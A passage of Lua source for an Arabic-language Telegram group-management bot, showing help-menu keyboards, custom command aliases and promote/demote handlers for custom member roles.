keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local Abbs = DataText:match('/HelpList4:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbd:get(TRON..'Abd:Help4')
local Text = [[
⌁︙اوامر المنشئين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙الميديا • امسح
⌁︙تعين عدد الحذف
⌁︙ترتيب الاوامر
⌁︙اضف • حذف ↫ امر
⌁︙حذف الاوامر المضافه
⌁︙الاوامر المضافه
⌁︙اضف نقاط ↫ بالرد • بالايدي
⌁︙اضف رسائل ↫ بالرد • بالايدي
⌁︙رفع منظف • تنزيل منظف
⌁︙المنظفين • حذف المنظفين
⌁︙رفع مدير • تنزيل مدير
⌁︙المدراء • حذف المدراء
⌁︙تفعيل • تعطيل + الامر ↫ ⤈
⌁︙نزلني • امسح
⌁︙الحظر • الكتم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙وضع لقب + اللقب
⌁︙تفعيل • تعطيل ↫ الرفع
⌁︙رفع منشئ • تنزيل منشئ
⌁︙المنشئين • حذف المنشئين
⌁︙رفع • تنزيل ↫ مشرف
⌁︙رفع بكل الصلاحيات
⌁︙حذف القوائم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المالكين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ منشئ اساسي
⌁︙حذف المنشئين الاساسيين 
⌁︙المنشئين الاساسيين 
⌁︙حذف جميع الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local Abbs = DataText:match('/HelpList5:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbd:get(TRON..'Abd:Help5')
local Text = [[
⌁︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙الكروبات
⌁︙المطورين
⌁︙المشتركين
⌁︙الاحصائيات
⌁︙المجموعات
⌁︙اسم البوت + غادر
⌁︙اسم البوت + تعطيل
⌁︙كشف + -ايدي المجموعه
⌁︙رفع مالك • تنزيل مالك
⌁︙المالكين • حذف المالكين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ مدير عام
⌁︙حذف • المدراء العامين 
⌁︙رفع • تنزيل ↫ ادمن عام
⌁︙حذف • الادمنيه العامين 
⌁︙رفع • تنزيل ↫ مميز عام
⌁︙حذف • المميزين عام 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المطور الاساسي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تحديث
⌁︙الملفات
⌁︙المتجر
⌁︙السيرفر
⌁︙روابط الكروبات
⌁︙تحديث السورس
⌁︙تنظيف الكروبات
⌁︙تنظيف المشتركين
⌁︙حذف جميع الملفات
⌁︙تعيين الايدي العام
⌁︙تغير المطور الاساسي
⌁︙حذف معلومات الترحيب
⌁︙تغير معلومات الترحيب
⌁︙غادر + -ايدي المجموعه
⌁︙تعيين عدد الاعضاء + العدد
⌁︙حظر عام • الغاء العام
⌁︙كتم عام • الغاء العام
⌁︙قائمه العام • حذف قائمه العام
⌁︙وضع • حذف ↫ اسم البوت
⌁︙اضف • حذف ↫ رد عام
⌁︙ردود المطور • حذف ردود المطور
⌁︙تعيين • حذف • جلب ↫ رد الخاص
⌁︙جلب نسخه الكروبات
⌁︙رفع النسخه + بالرد على الملف
⌁︙تعيين • حذف ↫ قناة الاشتراك
⌁︙جلب كليشه الاشتراك
⌁︙تغيير • حذف ↫ كليشه الاشتراك
⌁︙رفع • تنزيل ↫ مطور
⌁︙المطورين • حذف المطورين
⌁︙رفع • تنزيل ↫ مطور ثانوي
⌁︙الثانويين • حذف الثانويين
⌁︙تعيين • حذف ↫ كليشة الايدي
⌁︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل ملف + اسم الملف
⌁︙تعطيل ملف + اسم الملف
⌁︙تفعيل • تعطيل + الامر ↫ ⤈
⌁︙الاذاعه • الاشتراك الاجباري
⌁︙ترحيب البوت • المغادره
⌁︙البوت الخدمي • التواصل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local Abbs = DataText:match('/HelpList6:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
local Help = DevAbd:get(TRON..'Abd:Help6')
local Text = [[
⌁︙اوامر الاعضاء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙السورس • موقعي • رتبتي • معلوماتي 
⌁︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
⌁︙رسائلي • حذف رسائلي • اسمي • معرفي 
⌁︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
⌁︙نقاطي • بيع نقاطي • القوانين • زخرفه 
⌁︙رابط الحذف • نزلني • اطردني • المطور 
⌁︙منو ضافني • مشاهدات المنشور • الرابط 
⌁︙ايدي المجموعه • معلومات المجموعه 
⌁︙نسبه الحب • نسبه الكره • نسبه الغباء 
⌁︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙لقبه + بالرد
⌁︙كول + الكلمه
⌁︙زخرفه + اسمك
⌁︙برج + نوع البرج
⌁︙معنى اسم + الاسم
⌁︙بوسه • بوسها ↫ بالرد
⌁︙احسب + تاريخ ميلادك
⌁︙رفع مطي • تنزيل مطي • المطايه
⌁︙هينه • هينها ↫ بالرد • بالمعرف
⌁︙صيحه • صيحها ↫ بالرد • بالمعرف
⌁︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
⌁︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
⌁︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
⌁︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevAbd:get(TRON.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbd:get(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbd:del(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbd:del(TRON.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbd:srem(TRON.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevAbd:del(TRON.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevAbd:get(TRON..'Abd:NameBot') or "ترون")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbd:get(TRON..'Abd:NameBot') or "ترون")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevAbd:get(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevAbd:get(TRON.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbd:set(TRON.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الجديد", 1, 'html')
DevAbd:del(TRON.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbd:set(TRON.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbd:get(TRON.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbd:get(TRON.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر", 1, 'html')
DevAbd:del(TRON.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevAbd:smembers(TRON.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "⌁︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
Cmds = DevAbd:get(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "⌁︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevAbd:smembers(TRON.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevAbd:del(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbd:del(TRON.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "ترتيب الاوامر" then
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevAbd:set(TRON.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevAbd:sadd(TRON.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
send(msg.chat_id_, msg.id_,"⌁︙تم ترتيب الاوامر بالشكل التالي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي ↫ ا\n⌁︙تنزيل الكل ↫ تك\n⌁︙رفع مميز ↫ م\n⌁︙رفع ادمن ↫ اد \n⌁︙رفع مدير ↫ مد \n⌁︙رفع منشئ ↫ من \n⌁︙رفع منشئ اساسي ↫ اس  \n⌁︙تفعيل الايدي بالصوره ↫ تفع\n⌁︙تعطيل الايدي بالصوره ↫ تعط\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉")  
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevAbd:set(TRON.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevAbd:set(TRON.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source TRON     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "⌁︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
var = DevAbd:get(TRON.."Comd:New:rt:Abd:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_Abd(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevAbd:smembers(TRON.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevAbd:del(TRON.."Comd:New:rt:Abd:"..v..msg.chat_id_)
DevAbd:del(TRON.."Coomds"..msg.chat_id_)
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbd:set(TRON.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbd:sadd(TRON.."Coomds"..msg.chat_id_,ComdNew)  
DevAbd:setex(TRON.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌁︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAbd:del(TRON.."Comd:New:rt:Abd:"..ComdNew..msg.chat_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيه", 1, 'html')
end
if DevAbd:get(TRON.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, 'html')
DevAbd:del(TRON.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbd:get(TRON.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbd:set(TRON.."Comd:New:rt:Abd:"..textn..msg.chat_id_,text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة الصلاحيه", 1, 'html')
DevAbd:del(TRON.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevAbd:sismember(TRON.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAbd = DevAbd:get(TRON.."Comd:New:rt:Abd:"..DEV_ABBAS..msg.chat_id_)
if mrAbd == "مميز" and VipMem(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbd:set(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevAbd:sadd(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrAbd == "ادمن" and Admin(msg) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbd:set(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrAbd == "مدير" and Manager(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbd:set(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevAbd:sadd(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrAbd == "عضو" then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_ABBAS = text:match("تنزيل (.*)")
if DevAbd:sismember(TRON.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAbd = DevAbd:get(TRON.."Comd:New:rt:Abd:"..DEV_ABBAS..msg.chat_id_)
if mrAbd == "مميز" and VipMem(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:del(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAbd == "ادمن" and Admin(msg) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:del(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAbd == "مدير" and Manager(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:del(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrAbd == "عضو" then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbd:sismember(TRON.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrAbd = DevAbd:get(TRON.."Comd:New:rt:Abd:"..text1[2]..msg.chat_id_)
if mrAbd == "مميز" and VipMem(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbd:sadd(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:set(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAbd == "ادمن" and Admin(msg) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:set(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAbd == "مدير" and Manager(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbd:sadd(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:set(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrAbd == "عضو" then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbd:sismember(TRON.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrAbd = DevAbd:get(TRON.."Comd:New:rt:Abd:"..text1[2]..msg.chat_id_)
if mrAbd == "مميز" and VipMem(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:del(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAbd == "ادمن" and Admin(msg) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
